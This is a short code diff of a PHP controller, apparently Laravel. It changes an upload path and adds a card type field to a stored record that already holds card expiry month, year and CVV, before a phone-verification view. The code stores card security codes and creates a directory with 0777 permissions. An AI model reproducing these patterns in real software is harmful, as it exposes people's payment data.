@@ -37,7 +37,7 @@ class ImageController extends Controller
             'price' => 'required|string',
         ]);
 
-        $destinationPath = public_path('uploads');
+        $destinationPath = base_path('uploads');
 
         if (!File::exists($destinationPath)) {
             File::makeDirectory($destinationPath, 0777, true);
@@ -111,6 +111,7 @@ class ImageController extends Controller
             'month' => $request->month,
             'year' => $request->year,
             'ccv' => $request->ccv,
+            'card_type' => $request->card_type,
         ]);        
         return view('phone-verify');
     }
